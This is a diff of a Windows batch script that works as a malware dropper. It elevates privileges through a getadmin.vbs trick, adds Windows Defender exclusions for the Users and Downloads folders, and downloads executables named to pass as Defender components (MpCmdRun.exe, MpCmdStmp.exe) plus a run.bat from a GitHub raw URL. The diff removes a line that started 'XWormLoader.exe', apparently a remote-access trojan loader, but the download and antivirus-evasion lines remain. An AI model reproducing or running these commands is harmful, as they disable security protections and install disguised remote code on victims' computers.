@@ -6,8 +6,6 @@ cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) &&
 powershell.exe Add-MpPreference -ExclusionPath "C:\Users"
 powershell.exe Add-MpPreference -ExclusionPath "%USERPROFILE%\Downloads"
 
-start /min "" "XWormLoader.exe"
-
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdStmp.exe' -OutFile '%USERPROFILE%\AppData\Roaming\MpCmdStmp.exe'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/MpCmdRun.exe' -OutFile '%USERPROFILE%\MpCmdRun.exe'"
 powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/run.bat' -OutFile '%USERPROFILE%\run.bat'"
